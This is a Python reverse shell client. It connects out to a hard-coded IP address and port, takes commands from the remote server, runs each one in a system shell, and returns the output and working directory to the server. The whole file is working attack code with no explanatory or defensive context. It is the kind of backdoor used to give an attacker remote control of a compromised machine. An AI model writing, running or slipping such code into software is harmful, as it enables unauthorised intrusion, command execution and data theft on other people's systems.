# coded in python 3

# region Imports
import os
import socket
import subprocess
#endregion

# region Create a socket object
s = socket.socket()
#endregion

# region Define the host and port to connect to
host = '192.168.0.4'  # Change this to the IP address of the server
port = 9999
#endregion

# region Connect to the remote host
s.connect((host, port))
#endregion

#region Main loop to receive commands and execute them
while True:
    # Receive data from the server
    data = s.recv(1024)

    # If the received data starts with 'cd', change directory
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    # Check if data received is not empty
    if len(data) > 0:
        # Execute the received command using subprocess
        cmd = subprocess.Popen(data[:].decode("utf-8"),
                               shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        # Read the output of the command
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")

        # Send the output back to the server along with the current working directory
        s.send(str.encode(output_str + str(os.getcwd()) + '> ' ))

        # Print the output (optional)
        print(output_str)
#endregion

# region Close the connection
s.close()
#endregion